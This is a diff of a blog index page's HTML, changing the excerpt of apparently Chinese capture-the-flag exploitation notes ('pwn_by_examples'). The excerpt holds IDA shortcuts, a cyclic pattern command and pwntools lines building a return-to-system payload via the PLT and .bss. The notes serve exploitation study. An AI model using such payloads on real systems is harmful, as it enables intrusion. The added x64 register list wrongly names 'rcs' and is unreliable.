@@ -141,7 +141,8 @@
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">pwn_by_examplesIDA部分shift f12 字符串
+          <div class="index-text mb-1">pwn_by_examplesx64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存
+IDA部分shift f12 字符串
 n 重命名
 x 查看引用
 bash部分cyclic 200 #生成循环 200个
@@ -160,9 +161,7 @@ payload += p32(elf.bss() + 0x100)
 payload += p32(elf.plt[&#39;system&#39;])
 payload += p32(0)
 payload += p32(elf.bss() + 0x100)
-sh.sendline(payload)
-
-sh.sendline(&#</div>
+sh.</div>
         </div>
       </a>
 
